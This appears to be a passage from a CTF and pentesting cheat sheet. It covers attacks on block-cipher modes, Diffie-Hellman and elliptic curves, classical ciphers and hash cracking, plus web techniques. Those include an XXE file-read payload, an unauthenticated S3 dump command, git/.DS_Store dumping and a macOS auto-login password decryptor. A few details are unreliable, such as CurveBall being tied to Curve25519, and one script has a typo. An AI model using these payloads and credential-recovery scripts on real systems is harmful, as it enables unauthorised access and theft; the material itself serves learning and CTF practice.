[AES Output FeedBack](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) is an unusual stream cipher. It has no real benefits these days over CTR mode. Indeed CTR can be computed in parallel and allows random access in the ciphertext whereas OFB cannot.

###### Definition

![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption.png#gh-light-mode-only)
![OFB Encryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_encryption-dark.png#gh-dark-mode-only)
![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption.png#gh-light-mode-only)
![OFB Decryption](Cryptography/Symetric/AES/AES - OFB Mode/_img/601px-OFB_decryption-dark.png#gh-dark-mode-only)



#### AES - ECB Mode



[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.

###### Definition

![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
![ECB Encryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
![ECB Decryption](Cryptography/Symetric/AES/AES - ECB Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)

###### Attacks

* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)

	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.

* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)

	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
	



#### AES - CBC Mode



[AES Cipher Block Chaining](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) is the most commonly used mode of operation. It uses the previous output to xor the next input.

###### Definition

![CBC Encryption](Cryptography/Symetric/AES/AES - CBC Mode/_img/CBC_encryption.png#gh-light-mode-only)
![CBC Encryption](Cryptography/Symetric/AES/AES - CBC Mode/_img/CBC_encryption-dark.png#gh-dark-mode-only)
![CBC Decryption](Cryptography/Symetric/AES/AES - CBC Mode/_img/CBC_decryption.png#gh-light-mode-only)
![CBC Decryption](Cryptography/Symetric/AES/AES - CBC Mode/_img/CBC_decryption-dark.png#gh-dark-mode-only)

###### Attacks

* Bit flipping attack (CPA) - [Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack) [CryptoHack](https://cryptohack.org/courses/symmetric/flipping_cookie/)

    If an attacker can change the ciphertext, they can also alter the plaintext because of the XOR operation in the decryption process. (Homomorphic property of XOR, used in the previous block)
    
    **If you want to change the first block of plaintext**, you need to be able to edit the IV, as the first block of plaintext is XORed with the IV. If you don't have access to it, you can try to make the target system ignore the first block and edit the remainder instead. (example: json cookie {admin=False;randomstuff=whatever} -> {admin=False;rando;admin=True} )

    [Custom exploit script](Cryptography/Symetric/AES/AES - CBC Mode/Tools/bit-flipping-cbc.py) from this [Github gist](https://gist.github.com/nil0x42/8bb48b337d64971fb296b8b9b6e89a0d)

    [Video explanation](https://www.youtube.com/watch?v=QG-z0r9afIs)


* IV = Key - [StackExchange](https://crypto.stackexchange.com/questions/16161/problems-with-using-aes-key-as-iv-in-cbc-mode) [CryptoHack](https://aes.cryptohack.org/lazy_cbc/)

    When the IV is chosen as the key, AES becomes insecure. The Key can be leaked if you have a decryption oracle (CCA).



#### AES - GCM Mode



[AES Galois Counter Mode](https://en.wikipedia.org/wiki/Galois/Counter_Mode) is an authenticated encryption mode. For each encryption it produces a tag that can be used to verify the integrity of the message. It is considered secure and is used in TLS.

###### Definition

![AES GCM](Cryptography/Symetric/AES/AES - GCM Mode/_img/GCM-Galois_Counter_Mode_with_IV-dark.png#gh-dark-mode-only)
![AES GCM](Cryptography/Symetric/AES/AES - GCM Mode/_img/GCM-Galois_Counter_Mode_with_IV.png#gh-light-mode-only)

###### Attacks

* Forbidden attack - [CryptoHack](https://aes.cryptohack.org/forbidden_fruit/)

    When the nonce (IV) is reused in 2 different messages, an attacker can forge a tag for any ciphertext.

    [Cryptopals](https://toadstyle.org/cryptopals/63.txt) - Detailed explanation of the attack.

    [GitHub](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/gcm/forbidden_attack.py) - Implementation of the attack.

    [GitHub (Crypton)](https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden) - Summary of the attack.

    [This custom python script](Cryptography/Symetric/AES/AES - GCM Mode/Tools/forbidden_attack.py) gives an example implementation of the attack.



#### AES - CTR Mode



[AES Counter Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)) is using the AES output as a xor key. To generate the output a nonce is used, modified by a counter (concatenated, summed ...) at each block.

The main problem with this mode is that the nonce must be unique for each message, and the counter must be different for each block (it can be reset at each message). If this is not the case, the xor key will be the same for different blocks, which can compromise the encrypted message. (See the weaknesses of [XOR encryption](#..)

###### Definition

![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2.png#gh-light-mode-only)
![CTR Encryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_encryption_2-dark.png#gh-dark-mode-only)
![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
![CTR Decryption](Cryptography/Symetric/AES/AES - CTR Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)






### DES



[DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard) A.K.A. Data Encryption Standard is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption. It is a block cipher that encrypts data 64 bits at a time using a 56-bit key. The key is sometimes completed with an additional byte for parity check. DES is now considered insecure and has been replaced by AES.

Variations such as [Triple DES](https://en.wikipedia.org/wiki/Triple_DES) (3DES) and [DES-X](https://en.wikipedia.org/wiki/DES-X) have been created to improve the security of DES.

##### Attacks

* Weak keys - [Wikipedia](https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES) [CryptoHack](https://aes.cryptohack.org/triple_des/)

    DES allows for weak keys which are keys that produce the same ciphertext when used for encryption and decryption.

    Some weak keys with valid parity check are:

    * 0x0101010101010101
    * 0xFEFEFEFEFEFEFEFE
    * 0xE0E0E0E0F1F1F1F1
    * 0x1F1F1F1F0E0E0E0E

    Using multiple of these keys in [2 or 3 keys triple DES](https://en.wikipedia.org/wiki/Triple_DES#Keying_options) can also produce a symmetric 3DES block cipher.



### RC4



[RC4](https://en.wikipedia.org/wiki/RC4) is a fast stream cipher known to be very insecure.

##### Attacks

* FMS Attack - [Wikipedia](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) [CryptoHack](https://aes.cryptohack.org/oh_snap)

    Allows to recover the key from the keystream when RC4's key is in the form (nonce || unknown). Mostly used to recover WEP from WEP SNAP headers. An implementation and description of this attack can be found on [GitHub](https://github.com/jackieden26/FMS-Attack/blob/master/keyRecover.py).

    If you have an encryption (or decryption, it's the same) oracle, I recommend reading the writeups from this [CryptoHack challenge](https://aes.cryptohack.org/oh_snap).







## Diffie-Hellman



[The Diffie–Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) is a method that generates a shared secret over a public channel. This method is based on the [discrete logarithm problem](https://en.wikipedia.org/wiki/Discrete_logarithm) which is believed to be hard to solve.

#### Key generation (Textbook DH)

Suppose a situation where Alice and Bob want to create a shared secret key. They will use a public channel to do so.

1. They chose a standard prime number $p$ and a generator $g$. $g$ is usually 2 or 5 to make computations easier. $p$ and $g$ are public and $GF(p) = {0, 1, ..., p-1} = {g^0 \mod p, g^1 \mod p, ..., g^{p-1} \mod p}$ is a finite field.
2. They create private keys $a$ and $b$ respectively. $a, b \in GF(p)$.
3. They compute the public keys $A$ and $B$ and send them over the public channel.
    $$A = g^a \mod p$$
    $$B = g^b \mod p$$
4. They can now both compute the shared secret key $s$: Alice computes $s = B^a \mod p$ and Bob computes $s = A^b \mod p$.<br> 
    $$s = B^a = A^b = g^{ab} \mod p$$

They can now use the shared secret $s$ to derive a symmetric key for [AES](#aes) for example, and use it to encrypt their messages.


#### Attacks

* DH with weak prime using Pohlig–Hellman - [Wikipedia](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)

    The public prime modulus $p$ must be chosen such that $p = 2*q + 1$ where $q$ is also a prime. If $p-1$ is smooth (i.e have a lot of small, under 1000, factors), the Pohlig–Hellman algorithm can be used to compute the discrete logarithm very quickly. Sagemath's discrete_log function can be used to compute the discrete logarithm for such primes.

    Use [this script](Cryptography/Diffie-Hellman/Tools/smooth_number_generator.py) to generate smooth numbers of selected size.


* DH with small prime 

    The security of Diffie-Hellman is lower than the number of bits in $p$. Consequently, is p is too small (for example 64bits), it is possible to compute the discrete logarithm in a reasonable amount of time.

    ```python
    from sage.all import *
    a = discrete_log(Mod(A, p), Mod(g, p))
    ```



## Elliptic Curves

⇨ [ECDH](#ecdh)<br>


[ECC](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) is a set of **public-key** cryptographic algorithms based on **elliptic curves** over finite fields. It is used to create **digital signatures** and **key exchanges**.

#### General definition

As ECC relies on unusual mathematical problems and some concepts are very specific to this, the definition part is more detailed than orther sections.


Note: This section was made using the following resources:

| Name | Author |
| ---- | ------ |
| [Elliptic Curves Challenges](https://cryptohack.org/courses/elliptic/) | CryptoHack |
| [Elliptic Curve notes](https://web.archive.org/web/20220412170936/https://crypto.stanford.edu/pbc/notes/elliptic/) | Ben Lynn |
| [An Introduction to Mathematical Cryptography](https://www.math.brown.edu/~jhs/MathCryptoHome.html) | Jeffrey Hoffstein, Jill Pipher, Joseph H. Silverman |

##### Elliptic curve

> *Definition:* Elliptic curve
>
>Given a [field](https://en.wikipedia.org/wiki/Field_(mathematics)) $F$ and two constants $a, b \in F$, an **elliptic curve** $E$ over $F$ is the set of points $(x, y) \in F^2$ that satisfy the equation $Y^2 = X^3 + aX + b$:
>$$E(F) = \{(x, y) \in F^2 : y^2 = x^3 + ax + b\} \cup \{\mathcal{O}\}$$


To be a valid elliptic curve, the discriminant $\Delta = -16(4a^3 + 27b^2)$ must be non-zero, i.e $4a^3 + 27b^2 \neq 0$. Otherwise, the curve is called a singular curve.


We can already notice:
* The curve is symmetric about the $x$-axis, because $y^2 = (-y)^2$
* The curve contains [a point at infinity](https://en.wikipedia.org/wiki/Projective_geometry) $\mathcal{O}$.

##### Point adition

We can now define the addition of two points on an elliptic curve.

> *Definition*
>
>The **addition of two points** $P$ and $Q$ can be defined as follows: Take the line through $P$ and $Q$, and find the third point of intersection with this line. Then reflect this point about the $x$-axis. The result is $P + Q$.

* If $P = Q$, then the line is the tangent to the curve at $P$.
* If there is no third point of intersection, then the result is $\mathcal{O}$ which can be seen as [the point at infinity](https://en.wikipedia.org/wiki/Projective_geometry).

This figure represents $P + Q = R$:

![Point addition](Cryptography/Elliptic Curves/_img/EC_addition.png#gh-light-mode-only)
![Point addition](Cryptography/Elliptic Curves/_img/EC_addition-dark.png#gh-dark-mode-only)

> *Property*
>
>The following properties can be observed:
>- If $P$ and $Q$ have rational coordinates, then so does $R$.
>* $P + \mathcal{O} = \mathcal{O} + P = P$ (The point at infinity is the identity element.)
>- $P + (-P) = \mathcal{O}$ (The inverse of a point is its reflection about the $x$-axis.)
>* $P + Q = Q + P$ (Addition is commutative.)
>- $(P + Q) + R = P + (Q + R)$ (Addition is associative.)

These properties makes the set of points on an elliptic curve coupled with the point addition operation an [abelian group](https://en.wikipedia.org/wiki/Abelian_group).

Point addition can be computed using the following formulas:
* If $P \neq Q$:
$$\begin{cases}
x_R = \lambda^2 - x_P - x_Q \\
y_R = \lambda(x_P - x_R) - y_P \\
\end{cases}
\text{ where } \lambda = \frac{y_Q - y_P}{x_Q - x_P}$$

* If $P = Q$:
$$\begin{cases}
x_R = \lambda^2 - 2x_P \\
y_R = \lambda(x_P - x_R) - y_P \\
\end{cases}
\text{ where } \lambda = \frac{3x_P^2 + a}{2y_P}$$


#### EC Cryptography

In ellyptic curve cryptography, the coordinates of points are usually in a prime [finite field](https://en.wikipedia.org/wiki/Finite_field) $\mathbb{F}_p$ where $p$ is a **prime number**. However, it is also possible to use a **binary fields** $\mathbb{F}_{2^m}$.

Because of this, the set of points that verifies the equation of an elliptic curve can no longer be seen as a simple geometric curve. Now, the space can be seen as a **rectangular grid** of points. The left and right **edges of the grid are connected**, as well as the top and bottom edges. This is called a *torus*.

For exemple, here is the set of points of the elliptic curve $Y^2 = X^3 − X$ over $\mathbb{F}_{61}$:

![Elliptic curve over a finite field](Cryptography/Elliptic Curves/_img/Elliptic_curve_on_Z61.png#gh-light-mode-only)
![Elliptic curve over a finite field](Cryptography/Elliptic Curves/_img/Elliptic_curve_on_Z61-dark.png#gh-dark-mode-only)

We notice that:
* Point addition as we defined it before still works on this grid. See [this website](https://curves.xargs.org/) for visual examples.
* $\mathcal{O}$ is now (0, 0)
* Because the curve is symmetric about the $x$-axis and the space is finite, there is a new symmetry axis at the center of the grid.


Here is python sagemath code that defines the elliptic curve $Y^2 = X^3 − X$ over $\mathbb{F}_{61}$ and computes $P + Q$:

```python
p = 61
F = GF(p)
E = EllipticCurve(F, [-1, 0])
P = E(8, 4)
Q = E(17, 4)
R = P + Q # = R(36, 57)
```

##### Scalar multiplication

We can now define the **scalar multiplication** of a point $P$ by an integer $k$.

> *Definition*
>
>The **scalar multiplication** is defined by iterating addition: $kP = P + P + \cdots + P$ ($k$ times).

This operation is the *trapdoor function* of ECC, as inversing it is considered to be very hard. This problem is called the **elliptic curve discrete logarithm problem** (ECDLP): given $P$ and $Q$, find $k$ such that $Q = kP$.

#### Tricks

* Point from x

    Usually, public and private keys are not given as a point $P$ on the curve but **as an integer**. It is sometimes easier to work with the $x$ coordinate of the point, as there are only two possible values for $y$ for a given $x$. If $y1$ is a solution, $y2 = -y1$ is the other one. In addition, using either $y1$ or $y2$ does not change the result of computations.

    Here is a python sagemath function that returns the point $P$ from its $x$ coordinate:
    ```python
    P = E.lift_x(x, all=True)[0]
    ```

#### Attacks

##### Bad parameters

* Smooth order using Pohlig–Hellman - [Wikipedia](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)

    If the order of the curve is smooth (i.e have a lot of small - under 10**12 - factors), the Pohlig–Hellman algorithm can be used to compute the discrete logarithm very quickly. Consequently, if he order is not prime itself, it must al least contain a large prime factor to prevent this.

    Sagemath's discrete_log function can be used to compute the discrete logarithm for such primes. [This script](Cryptography/Elliptic Curves/Tools/smooth_order/smooth_number_generator.py) can be used to generate smooth numbers of selected size while [this script](Cryptography/Elliptic Curves/Tools/smooth_order/ec_pohlig_hellman.py) can be used to compute the discrete logarithm on EC points.

* MOV attack - [StackExchange](https://crypto.stackexchange.com/questions/1871/how-does-the-mov-attack-work)

    Some curves are vulnerable if they have a *small embedding degree*, such as *supersingular curves*. 
    
    > *Definition* Embedding degree
    >The embedding degree is the smallest integer $k$ such that the curve can be embedded in a field $\mathbb{F}_{p^k}$: 
    >
    >$$(p^k-1) = 0 \mod E.order$$

    If $k$ is small, the discrete logarithm can be computed in $\mathbb{F}_{p^k}$.

    [This script](Cryptography/Elliptic Curves/Tools/mov_attack/mov_attack.py) can be used to compute the discrete logarithm on EC points using the MOV attack.

* Smart's attack on an anomalous curve

    When the order of the curve is the same as the prime $p$ of the field, the curve is called an *anomalous curve*. In this case, the discrete logarithm can be computed using [smart's attack](https://www.hpl.hp.com/techreports/97/HPL-97-128.pdf) from Lifts and Hensel's Lemma. A description of the attack can be found [here](https://wstein.org/edu/2010/414/projects/novotney.pdf).

    [This github repository](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/ecc/smart_attack.py) contains an implementation of smart's attack.

* Singular curve - [StackExchange](https://crypto.stackexchange.com/questions/70373/why-are-singular-elliptic-curves-bad-for-crypto)

    If the discriminant of the curve $\Delta = -16(4a^3 + 27b^2)$ is zero, the curve is called a *singular curve*. In this case, there is a bijection between the points of the curve and groups where the discrete logarithm is easy to compute. 

    [This repository](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/ecc/singular_curve.py) contains an implementation of the attack.


##### Bad implementations

* CurveBall (CVE-2020-0601) - [GitHub](https://github.com/IIICTECH/-CVE-2020-0601-ECC---EXPLOIT)

    This attack exploits a vulnerability in the implementation of the [Curve25519](https://en.wikipedia.org/wiki/Curve25519) curve in Windows crypto API. The implementation does not check the provided generator $G$ and uses it for computations, making it possible to forge certificates for any domain.

* Elliptic Curves on Real numbers - [Cryptohack](https://cryptohack.org/challenges/real_curves/solutions/)

    Discrete logarithm on elliptic curves over real numbers can be reduced to SVP using many methods.

### ECDH



Elliptic curve Diffie-Hellman ([ECDH](https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman)) is a elliptic curve variant of the [Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) key exchange protocol. It allows two parties to establish a shared secret over an insecure channel. The shared secret can then be used to encrypt messages between the two parties.

See the [Diffie-Hellman section](#diffie-hellman) for more information on the key exchange protocol.

##### Attacks

###### Bad Parameters

* Small secret - [CryptoHack](https://cryptohack.org/challenges/micro/solutions/)

    If one of the secret integers is small and the order of the curve is rather smooth (i.e has very few lage, over $10^{12}$, factors), using Pohlig-Hellman to solve the discrete logarithm problem on the subgrups of the small factors can be enough to recover the secret.





## Hashes

⇨ [MD5](#md5)<br>


* `Hash types` - [Website](https://hashcat.net/wiki/doku.php?id=example_hashes)

    Different hash types exists, and they are used in different contexts. This page lists the most common hash types and their respective hashcat modes.

| Hash type | Byte Length | Hashcat mode | Example hash  |
|-----------|--------------|--------------|--------------|
| MD5      | 32  | 0    | `8743b52063cd84097a65d1633f5c74f5` |
| SHA1     | 40  | 100  | `b89eaac7e61417341b710b727768294d0e6a277b` |
| SHA256   | 64  | 1400 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
| SHA2-512 | 128 | 1700 | too long |

#### Tools

* `Haiti` - [GitHub](https://github.com/noraj/haiti/)

    CLI Hash type identifier

* `Hashcat` - [Website](https://hashcat.net/hashcat/)

    Crack hashes. Can use GPU.


* `John the Ripper` - [Website](https://www.openwall.com/john/)

    Better compatibility and easier to use than hashcat, but lower number of hash types supported.

* `dcipher` - [GitHub](https://github.com/k4m4/dcipher-cli)

    CLI tool to lookup hashes in online databases.

### MD5



[MD5](https://en.wikipedia.org/wiki/MD5) (Message Digest Algorithm 5) is a historically significant cryptographic hash function. It is no longer considered secure as it has been found to suffer from extensive weaknesses.


* MD5 collisions

    MD5 is know to have collision issues. For exemple, it is very easy to find two byte strings with a given prefix that have the same MD5 hash.

    See these github repositories for more information:
    - [collisions](https://github.com/corkami/collisions)
    - [hashclash](https://github.com/cr-marcstevens/hashclash)

* MD5 length extension - [GitHub](https://github.com/iagox86/hash_extender)

    MD5 is also vulnerable to length extension attacks. This means that if you have the hash of a message, you can easily compute the hash of a message that has the original message as a prefix.

    See this [GitHub repository](https://github.com/iagox86/hash_extender) for more information.





## Misc Codes



#### Tools

* `DCode` <span style="color:red">❤️</span> - [Website](https://www.dcode.fr)

	Support many crypto algorithms, but also some interesting tools.


* `CyberChef` - [Website](https://gchq.github.io/CyberChef/)

	Online tool to encrypt/decrypt, encode/decode, analyze, and perform many other operations on data.

* `Ciphey` - [GitHub](https://github.com/Ciphey/Ciphey)

	Automated cryptanalysis tool. It can detect the type of cipher used and try to decrypt it.
	
	Requires python version strickly less than 3.10.

	Will be replaced in the future by [Ares](https://github.com/bee-san/Ares)

#### Misc Codes

Here is a list of misc codes. The goal of this section is to help recognize them and provide tools to decode them.

##### One time pad based codes

* `One time pad` - [Wikipedia](https://en.wikipedia.org/wiki/One-time_pad) - `Many time pad`

	Encrypt each character with a pre-shared key. The key must be as long as the message. The key must be random and never reused.

	This can be done using XOR :

	- Encryption: c = m ^ k
	- Decryption: m = c ^ k

	If the key is repeated, it is a type of **Vigenere cipher**. [This template](Cryptography/Misc Codes/Tools/repeated_xor.ipynb) helps to crack repeated XOR keys. [`xortools`](https://github.com/hellman/xortool) can also be used for this. This is called `Many time pad`

* `Many time pad` on images/data

	When structured data is xored with a key, it is possible to find information about the plaintext using multiple ciphertexts.

	[This stackexchange question](https://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse) can help understand how the re-use of a `One time pad` can be dangerous on structured data.

* `Vigenere Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) 
	
	Shift cipher using a key. The key is repeated to match the length of the message.

	| Type    | Content     |
    |---------|-------------|
	| Message | HELLO WORLD |
	| Key     | ABCDE FABCD |
	| Cipher (sum)%26  | HFNLP XQEMK |

	This can be cracked using [this online tool](https://www.dcode.fr/vigenere-cipher).

* `Gronsfeld Cipher` - [Website](http://rumkin.com/tools/cipher/gronsfeld.php)

	Variant of the Vigenere cipher using a key of numbers instead of letters.


##### Substitution Ciphers

Substitution ciphers are ciphers where each letter is replaced by another letter. The key is the translation table. They are vulnerable to **frequency analysis**. [This online tool](https://www.dcode.fr/substitution-cipher) can be used to decipher them (translated to the latin alphabet if needed).

* `Keyboard Shift` - [Website](https://www.dcode.fr/keyboard-shift-cipher)

	ROT but using the keyboard layout.

* `Caesar Cipher` - [Website](https://www.dcode.fr/caesar-cipher)

	Shift cipher using the alphabet. Different alphabets can also be used. Vulnerable to **frequency analysis**.

* `Atbash Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Atbash) 
	
	Shift cipher using the alphabet in reverse order.

* `Symbol Substitution Cipher` - [Website](https://www.dcode.fr/tools-list#symbols)

	Regular letters can be replaced with symbols. Those are often references to video games or films. You can either translate it to any regular letters and use a [substitution cipher solver](https://www.dcode.fr/substitution-cipher), or find it's translation table and use it.

	The most common ones are:
	| Name | Description |
	|------|-------------|
	| [Daggers Cipher](https://www.dcode.fr/daggers-alphabet) | Swords/daggers |
	| [Hylian Language (Twilight Princess)](https://www.dcode.fr/hylian-language-twilight-princess) | Lot of vertical lines |
	| [Hylian Language (Breath of the Wild)]((https://www.dcode.fr/hylian-language-breath-of-the-wild)) | Similar to uppercase Latin |
	| [Sheikah Language (Breathe of the Wild)](https://www.dcode.fr/sheikah-language) | Lines in a square |
	| [Standard Galactic Alphabet](https://www.dcode.fr/standard-galactic-alphabet) | Vertical and horizontal lines |

* Phone-Keypad

	Letters can be encoded with numbers using a phone keypad.

	| | | |
	|-|-|-|
	| **1** _ , @ | **2** A B C | **3** D E F |
	| **4** G H I | **5** J K L | **6** M N O |
	| **7** P Q R S | **8** T U V | **9** W X Y Z |
	| **\*** _ | **0** + | **#** _ |

* `Beaufourt Cipher` - [Website](https://www.dcode.fr/beaufort-cipher)

	Substitute letters to their index in the alphabet.

* `Polybius Square Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Polybius_square)

	Substitution cipher using a 5x5 grid. Each letter is presented by its coordinates on the grid, often written as a two-digit number.

	Can be cracked using simple frequency analysis. The main difficulty is to change the format of the ciphertext to make it easier to analyze.


##### Transposition Ciphers

* `Transposition Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Transposition_cipher)

	Reorder the letters of the message. The key is the order of the letters.

	Example: `HELLO WORLD` with key `1,9,2,4,3,11,5,7,6,8,10` becomes `HLOLWROLED `.

	[This online tool](https://www.dcode.fr/transposition-cipher) can be used to decipher it.

##### Other

* `Bacon Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Bacon%27s_cipher)

	Recognizable when the ciphertext only contains two symbols (e.g.: A and B) and the length of the ciphertext is a multiple of 5. Example: `aabbbaabaaababbababbabbba babbaabbbabaaabababbaaabb`.

	Each group of 5 symbols is a letter. It can be deciphered using [this online tool](http://rumkin.com/tools/cipher/baconian.php).

* `LC4` - [Article](https://eprint.iacr.org/2017/339.pdf) 
	
	Encryption algorithm designed to be computed by hand. [This repository](https://github.com/dstein64/LC4) provides an implementation of it.


* `Railfence Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Rail_fence_cipher)

	Transposition cipher using a key. The key is the number of rails.

	example: Hello world! with 3 rails -> Horel ol!lwd<br>
	```
	H . . . o . . . r . . .
    . e . l . _ . o . l . !
    . . l . . . w . . . d .
	```

	[This repository](https://github.com/CrypTools/RailfenceCipher) provides an implementation of it.

* `Playfair Cipher` - [Wikipedia](https://en.wikipedia.org/wiki/Playfair_cipher)

	Encrypt messages by bigrams (pairs of letters).
	[This online tool](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html) can help to crack it.


* `International Code of Signals` - [Wikipedia](https://en.wikipedia.org/wiki/International_Code_of_Signals) 
	
	Using flags to transmit messages. Often used on boats.	


* `EFF/DICE` - [Website](https://www.eff.org/dice)

	Generate passphrases from dice rolls. Each set of 5 dice rolls are translated to a word.

* `Base64` <span style="color:red">❤️</span>, `Base32`, `Base85`, `Base91` ...

	| Name | Charset | example |
	| --- | --- | --- |
	| Base64 | `A-Za-z0-9+/` | `SGVsbG8gV29ybGQh` |
	| Base32 | `A-Z2-7` | `JBSWY3DPEBLW64TMMQ======` |
	| Base85 | `A-Za-z0-9!#$%&()*+-;<=>?@^_` | `9jqo^F*bKt7!8'or``]8%F<+qT*` |
	| Base91 | `A-Za-z0-9!#$%&()*+,./:;<=>?@[]^_` | `fPNKd)T1E8K\*+9MH/@RPE.` |

	Usually decoded with python's `base64` lib, or the `base64 -d` command.


* `Base65535` - [GitHub](https://github.com/qntm/base65536)

	Each symbol (number) is encoded on 2 bytes. Consequently, when decoded to unicode, most symbols are very uncommon and also chinese characters.


* `Base41` - [GitHub](https://github.com/sveljko/base41/blob/master/python/base41.py)

	Just another data representation.


* `Enigma` - [Wikipedia](https://en.wikipedia.org/wiki/Enigma_machine)

	Machine used by the Germans during World War II to encrypt messages. Still takes a lot of time to crack today, but some tricks can be used to speed up the process.

	[404CTF WU](https://remyoudompheng.github.io/ctf/404ctf/enigma.html)


	


<br><br>

# Web

⇨ [Enumeration](#enumeration)<br>
⇨ [GraphQL](#graphql)<br>
⇨ [PHP](#php)<br>
⇨ [Request and Cookie Forgery](#request-and-cookie-forgery)<br>
⇨ [SQL Injection](#sql-injection)<br>
⇨ [XSS](#xss)<br>
⇨ [JWT](#jwt)<br>


### Tools

* `wpscan` - [Website](https://wpscan.org/)

  Scan [Wordpress](https://en.wikipedia.org/wiki/WordPress) sites for vulnerabilities.


* `nikto` - [GitHub](https://github\.com/sullo/nikto)

	Website scanner implemented in [Perl](https://en.wikipedia.org/wiki/Perl).


* `Burpsuite` <span style="color:red">❤️</span> - [Website](https://portswigger.net/burp)

	Most used tool to do web pentesting. It is a proxy that allows you to intercept and modify HTTP requests and responses.

### Attacks

* AWS / S3 Buckets dump

	Dump all files from a S3 bucket that does not require authentication.

	``` bash
	aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
	```

* XXE : XML External Entity

    Include local files in XML. Can be used to make an **LFI** from a XML parser.
    XML script to display the content of the file /flag :

    Don't forget to use <?xml version="1.0" encoding="UTF-16"?> on Windows (for utf16).

	``` xml
	<?xml version="1.0"?>
	<!DOCTYPE data [
	<!ELEMENT data (#ANY)>
	<!ENTITY file SYSTEM "file:///flag">
	]>
	<data>&file;</data>
	```


## Enumeration





* `/robots.txt` <span style="color:red">❤️</span>

	File to tell search engines not to index certain files or directories.


* Mac / Macintosh / Apple Hidden Files `.DS_Store` [DS_Store_crawler](https://github.com/anantshri/DS_Store_crawler_parser)

	On Mac, there is a hidden index file `.DS_Store` listing the content of the directory. Useful if you have a **LFI** vulnerability.

    ```bash
    python3 dsstore_crawler.py -i <url>
    ```

* Bazaar `.bzr` directory

	Contains the history of the project. Can be used to find old versions of the project. Can be fetched with [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

    Download the bzr repository:
    ```bash
    bzr branch <url> <out-dir>
    ```


* `GitDumper` <span style="color:red">❤️</span> - [GitHub](https://github.com/arthaud/git-dumper)

	A command-line tool that will automatically scrape and download a [git](https://git-scm.com/) repository hosted online with a given URL.

    When `/.git` is reachable, there is a [git](https://git-scm.com/) repo that contains the history of the project. Can be used to find old versions of the project and to maybe find **credentials** in sources. Use git commands (from your favorite git cheatsheet) to navigate the history.

    ```bash
    gitdumper <url>/.git/ <out-dir>
    ```

* Mac AutoLogin Password Cracking with `/etc/kcpassword`

	`/etc/kcpassword` is a file that contains the password for the Mac OS X auto-login user. It is encrypted with a key that is stored in the kernel, but sometimes it can be decrypted with the following python script:

    ``` python
    def kcpasswd(ciphertext):
        key = '7d895223d2bcddeaa3b91f'
        while len(key) < (len(ciphertext)*2):
            key = key + key
        key = binasciiunhexlify(key)
        result = ''
        for i in range(len(ciphertext)):
            result += chr(ord(ciphertext[i]) ^ (key[i]))
        return result
    ```




## GraphQL



GraphQL is a query language for APIs.

* `graphQLmap` - [GitHub](https://github.com/swisskyrepo/GraphQLmap)

    Parse a GraphQL endpoint and extract data from it using introspection queries.

    ```bash
    # Dump names with introspection
    dump_via_introspection
    
    # Make a query
    {name(id: 0){id, value}}

    # Check if there is something in the first 30 ids
    {name(id: GRAPHQL_INCREMENT_10){id, value}}
    ```




## PHP




* `Magic Hashes` - [CheatSheet](https://github.com/spaze/hashes)

